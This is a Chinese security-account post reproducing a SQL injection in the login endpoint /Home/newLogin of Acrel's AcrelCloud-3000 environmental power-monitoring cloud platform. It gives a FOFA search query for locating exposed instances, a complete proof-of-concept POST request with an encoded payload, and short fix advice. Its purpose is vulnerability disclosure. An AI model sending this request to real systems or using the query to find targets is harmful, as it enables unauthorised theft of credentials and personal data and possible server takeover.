#  【漏洞复现】安科瑞环保用电监管云平台 HomenewLogin SQL注入漏洞复现   
河北镌远  河北镌远网络科技有限公司   2024-11-29 10:23  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/5xic9OHsHiafbUVg4naibSQnNsuMVRYqdlLLzHovhH9jcrrEaj6ia94y9TTpBJTlQDQBcgwMczFq8BRURR9fJIdeLg/640?wx_fmt=gif&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz/UC6M1Hf0SSEpr1lbbiatiaxPJc8y9JcOeRyJOIhsibwSxWPmHCqJwzWX8xTMz9MYLpHKAkRfY2fcMqovyxrR9KpAw/640?wx_fmt=gif "")  
  
点击箭头处  
“蓝色字”  
，关注我们哦！！  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWjQUicurovUqWM6AK77bH7BF2uEmx5b0F3eOp7LL5aBicsKltjC73EKjAMLMkUBHjA3LVWbjicR5cnYg/640?wx_fmt=png&from=appmsg "")  
  
  
  
**产品简介**  
  
  
  
**AcrelCloud-3000环保用电监管云平台**依托创新的物联网电力传感技术，实时采集企业总用电、生产设备及环保治理设备用电数据，通过关联分析、超限分析、停电分析、停限产分析，结合及时发现环保治理设备未开启、异常关闭及减速、空转、降频等异常情况，同时通过数据分析还可以实时监控限产和停产整治企业运行状态，用户可以利用PC、手机、平板电脑等多种终端实现对平台的访问。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWjQUicurovUqWM6AK77bH7BF2uEmx5b0F3eOp7LL5aBicsKltjC73EKjAMLMkUBHjA3LVWbjicR5cnYg/640?wx_fmt=png&from=appmsg "")  
  
  
  
**漏洞概述**  
  
  
  
**安科瑞环保用电监管云平台 Home/newLogin 登录接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWjQUicurovUqWM6AK77bH7BF2uEmx5b0F3eOp7LL5aBicsKltjC73EKjAMLMkUBHjA3LVWbjicR5cnYg/640?wx_fmt=png&from=appmsg "")  
  
  
  
**复现环境**  
  
  
  
**FOFA：body="myCss/phone.css"**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5xic9OHsHiafbf9icrGmmuFafP7l9nS8vGuQybmSghrzjdEfhZjTVzbnh2nB7JMfeaBaPribNYuaX3nz3VuxorGhbg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWjQUicurovUqWM6AK77bH7BF2uEmx5b0F3eOp7LL5aBicsKltjC73EKjAMLMkUBHjA3LVWbjicR5cnYg/640?wx_fmt=png&from=appmsg "")  
  
  
  
**漏洞复现**  
  
  
  
**PoC**  
  
POST /Home/newLogin HTTP/1.1  
  
**Host:**  
  
Accept: application/json, text/javascript, */*; q=0.01  
  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
  
Accept-Encoding: gzip, deflate  
  
Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
  
X-Requested-With: XMLHttpRequest  
  
Priority: u=0  
  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0  
  
Content-Length: 193  
  
data=AmILgROn2omEYq%2Bd8Urox8DW%2F8rRQwsBzOEz00K3cyMY1DhHq6oDzKni9uNo6p7VIuEZBk0edl%2Blr8MukZeYaoj5ogyFWf1wJQ6iDSwIHOKSdk2%2BRRo%2FbhB70T5AlQ3PB6Ca1I6PvvVefK%2BuEF6b%2BqnvUH5y0gix7tq3yw1WJdc%3D  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5xic9OHsHiafbf9icrGmmuFafP7l9nS8vGuicNtcic7Yf5TjbiaoIh54XicBl53EOUnKGcRUAMbfua3x9JRIXr9GnSEKg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWjQUicurovUqWM6AK77bH7BF2uEmx5b0F3eOp7LL5aBicsKltjC73EKjAMLMkUBHjA3LVWbjicR5cnYg/640?wx_fmt=png&from=appmsg "")  
  
  
  
**修复建议**  
  
  
  
**关闭互联网暴露面或接口设置访问权限**  
  
**升级至安全版本**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5xic9OHsHiafZBZZ3yiaibiaZCPcv4FLUUkic7Juicamh0zLreL6e2KWZpz8iaeeyEnrmV98VmYN5UibkP0tQQoRz5FAswg/640?wx_fmt=png "")  
  
文章来源：  
网络  
  
公众号“河北镌远网络科技有限公司”所发表内容注明来源的，版权归原出处所有（无法查证版权的或者未注明出处的均来自网络，系转载，转载的目的在于传递更多信息，版权属于原作者。如有侵权，请联系，小编会第一时间删除处理。  
  
  
  
  
  
  
  
